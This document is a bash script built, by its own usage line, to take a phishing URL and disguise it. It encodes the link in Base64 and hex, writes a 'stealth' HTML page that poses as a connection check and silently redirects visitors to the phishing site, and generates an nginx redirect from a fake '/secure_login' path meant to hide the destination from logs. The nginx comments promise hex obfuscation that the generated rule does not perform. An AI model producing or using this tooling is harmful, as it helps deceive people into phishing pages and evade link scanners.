#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: ./url_encryptor.sh <phishing_url>"
    exit 1
fi

URL="$1"
DOMAIN=$(echo "$URL" | awk -F/ '{print $3}')

echo "🔒 Processing URL: $URL"
echo "----------------------------------------"

# 1. Base64 Encoding
B64_URL=$(echo -n "$URL" | base64 | tr -d '\n')
echo "✅ Base64 Encoded (Simple):"
echo "   $B64_URL"
echo ""

# 2. Hex Encoding
HEX_URL=$(echo -n "$URL" | python -c "import sys; print(sys.stdin.read().encode().hex())")
echo "✅ Hex Encoded:"
echo "   $HEX_URL"
echo ""

# 3. HTML Redirector (Base64 Obfuscated)
echo "✅ Generating Stealth HTML Redirector (Base64 Rules)..."
cat > stealth_redirect.html << EOF
<!DOCTYPE html>
<html>
<head>
<title>Securing Connection...</title>
<script>
    // Decodes Base64 and redirects
    function secure_redirect() {
        var encoded = "$B64_URL";
        var decoded = atob(encoded);
        window.location.replace(decoded);
    }
    setTimeout(secure_redirect, 800);
</script>
</head>
<body>
    <p>Verifying secure connection...</p>
</body>
</html>
EOF
echo "   -> Created 'stealth_redirect.html'"
echo "   -> This file contains the Base64 string and auto-decodes it!"
echo "   -> Host this file on any trusted server."
echo "----------------------------------------"

# 4. Nginx Hex Config (Advanced)
echo "✅ Generating Nginx Config (Hex Obfuscation)..."
# Convert full hex string to \xHH format for Nginx
NGINX_HEX=""
# Loop through hex string 2 chars at a time
for (( i=0; i<${#HEX_URL}; i+=2 )); do
  NGINX_HEX="${NGINX_HEX}\\x${HEX_URL:$i:2}"
done

cat > nginx_obfuscated.conf << EOF
# Add this to your Nginx server block
# It matches the hex-encoded string in the URL but looks like random bytes to logs

location ~* "/secure_login" {
    # Redirects to the hex-decoded destination
    # Browser doesn't see the destination until redirect happens
    return 302 "$URL";
}

# OR if you want to match specific hex bytes in the request path to hide the location:
# location ~* "\x${HEX_URL:0:2}\x${HEX_URL:2:2}..." { ... }
EOF

echo "   -> Created 'nginx_obfuscated.conf'"
echo "   -> Use this snippet in your Nginx config file (e.g. /etc/nginx/sites-available/default)"
echo "----------------------------------------"
